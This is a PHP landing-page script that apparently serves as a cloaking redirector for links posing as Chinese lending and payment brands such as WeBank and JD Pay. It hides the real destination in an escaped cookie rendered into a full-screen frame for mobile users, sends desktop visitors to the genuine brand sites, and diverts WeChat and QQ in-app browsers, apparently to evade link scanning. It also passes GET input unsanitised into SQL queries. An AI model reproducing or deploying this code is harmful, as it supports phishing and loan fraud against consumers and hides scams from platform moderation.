<?php
include('config.php');
include 'txprotect.php';
function UnicodeEncode($str){
    //split word
    preg_match_all('/./u',$str,$matches);
 
    $unicodeStr = "";
    foreach($matches[0] as $m){
        //拼接
        $unicodeStr .= "&#".base_convert(bin2hex(iconv('UTF-8',"UCS-4",$m)),16,10);
    }
    return $unicodeStr;
}
function escapes($str) {
	$sublen = strlen ( $str );
	$retrunString = "";
	for($i = 0; $i < $sublen; $i ++) {
		if (ord ( $str [$i] ) >= 127) {
			$tmpString = bin2hex ( iconv ( "gb2312", "ucs-2", substr ( $str, $i, 2 ) ) );
			$retrunString .= "%u" . $tmpString;
			$i ++;
		} else {
			$retrunString .= "%" . dechex ( ord ( $str [$i] ) );
		}
	}
	return $retrunString;
}


function unescapes($str) {
	$str = rawurldecode ( $str );
	preg_match_all ( "/%u.{4}|&#x.{4};|&#\d+;|.+/U", $str, $r );
	$ar = $r [0];
	foreach ( $ar as $k => $v ) {
		if (substr ( $v, 0, 2 ) == "%u")
			$ar [$k] = iconv ( "UCS-2", "GBK", pack ( "H4", substr ( $v, - 4 ) ) );
		elseif (substr ( $v, 0, 3 ) == "&#x")
			$ar [$k] = iconv ( "UCS-2", "GBK", pack ( "H4", substr ( $v, 3, - 1 ) ) );
		elseif (substr ( $v, 0, 2 ) == "&#") {
			$ar [$k] = iconv ( "UCS-2", "GBK", pack ( "n", substr ( $v, 2, - 1 ) ) );
		}
	}
	return join ( "", $ar );
}

function dstrpos($string,$arr)
{
	if(!empty($string))
	{
		foreach((array)$arr as $v)
		{
			if(strpos(strtolower($string),$v) !== false)
			{
				return true;
			}
		}
	}
	return false;
}

function type(){
		//获取USER AGENT
	$ClientUa = $_SERVER['HTTP_USER_AGENT'];
	
        //1 ios wx、2 ios qq、3 android wx、4 android qq、5 其他电脑客户端
    if(strpos($ClientUa, 'iPhone') || strpos($ClientUa, 'iPad')){
        if(strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false)
        {
            return true;
        }elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/') !== false)
        {
            return true;
        }else{
            return false;
        }
    }else if(strpos($ClientUa, 'Android')){
        if(strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false)
        {
            return true;
        }elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/') !== false)
        {
            return true;
        }else{
           return false;
        }
    }else{
        return false;
    }
    
}

function luodi($url)
{
	$cookievalue = '<script>var t;function r(){if(document.getElementById("a") !=null){clearInterval(t);}}t=setInterval(r,10);</script><frameset border=0 frameBorder=NO><frame name="ds" id="d" src="'.$url.'"></frameset>';
	
	$cookievalue = escapes($cookievalue);
	$userid = md5(time());
	setcookie('uid',$cookievalue,time()+3600);
	setcookie('user',$userid,time()+3600);
	echo '<!DOCTYPE html>
	<html lang="en">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	</head>
	<script language="javascript">
	function getCookie(c_name)
	{
	if (document.cookie.length>0)
	{
	c_start=document.cookie.indexOf(c_name + "=")
	if (c_start!=-1)
	{
	c_start=c_start + c_name.length+1
	c_end=document.cookie.indexOf(";",c_start)
	if (c_end==-1) c_end=document.cookie.length
	return unescape(document.cookie.substring(c_start,c_end))
	} 
	}
	return ""; 
	}
	var uid=unescape(unescape(getCookie("uid")));
	document.writeln(uid);
	setCookie("user","'.$userid.'");
	</script>';

}


	$user_a = base64_decode($_GET['user']);

	$sqlcout = mysql_query("select * from url where url='$user_a' and   DATE_SUB(CURDATE(), INTERVAL 5 DAY) <= time  and 1000 <= id limit 1");   //根据网址取出现有次数
	if($data = mysql_fetch_array($sqlcout)){}
	else{
		exit('信息不存在或链接已过期!!!'.mysql_error());
	}
	
	switch ($data['title'])
		{
		case '捷信金融':
		  $gw= 'http://www.homecreditcfc.cn' ;
		  break; 
		case '微粒贷':
		  $gw= 'https://www.webank.com/' ;
		  break;
		case '分期乐':
		  $gw= 'https://www.fenqile.com/' ;
		  break; 
		 case '分期花':
		  $gw= 'https://www.mucfc.com/' ;
		  break; 
		case '安逸花':
		  $gw= 'https://anyihua.msxf.com/' ;
		  break;
		case '京东钱包':
		  $gw= 'https://www.jdpay.com' ;
		  break; 
		case 'ppmoney借钱':
		  $gw= 'https://www.ppmoney.com/' ;
		  break; 
		case '宜人贷':
		  $gw= 'https://www.yirendai.com/' ;
		  break;  
		case '平安普惠':
		  $gw= 'https://haodai.pingan.com/' ;
		  break;  
		default:
		  $gw= 'https://www.baidu.com' ;
	}

	$cout = $data['cont']; 
	$cout = $cout+1;
    $update = "UPDATE url SET cont = '$cout' WHERE  url='$user_a' limit 1";
    mysql_query($update,$con);
	$title = UnicodeEncode($data['title']);
	$url = $data['url'];
	
	if($data['jump']){
		if(type()){
			echo '<title>请在浏览器打开</title>';
			include 'tips.php';
			exit;
		}
	}
	echo '<title>'.$title.'</title>';
	
	if($data['gw']){
		if(dstrpos($_SERVER['HTTP_USER_AGENT'],array('iphone','ipad','ipod','android'))){
			exit(luodi($url));
		}else{
			exit(
				'<script language="javascript">
				 
				//document.location.href='.$gw.';
				window.open("'.$gw.'","_top") 
				</script>' );
		}
	}else{
		exit(luodi($url));
	}
?>




